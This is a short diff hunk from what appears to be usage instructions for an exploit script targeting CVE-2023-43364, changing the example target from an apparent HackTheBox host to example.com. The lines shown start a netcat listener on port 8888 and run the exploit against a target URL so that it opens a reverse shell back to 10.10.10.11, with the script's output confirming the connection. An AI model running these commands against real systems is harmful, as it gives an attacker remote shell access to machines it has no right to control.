@@ -8,7 +8,7 @@ nc -nvlp 8888
 ```
 2. Run the exploit.
 ```
-python3 CVE-2023-43364.py -u http://searcher.htb/ -rh 10.10.10.11 -rp 8888
+python3 CVE-2023-43364.py -u http://example.com/ -rh 10.10.10.11 -rp 8888
 Connection Established Successfully.
 Trying to open a reverse shell on 10.10.10.11 at 8888...
 ```
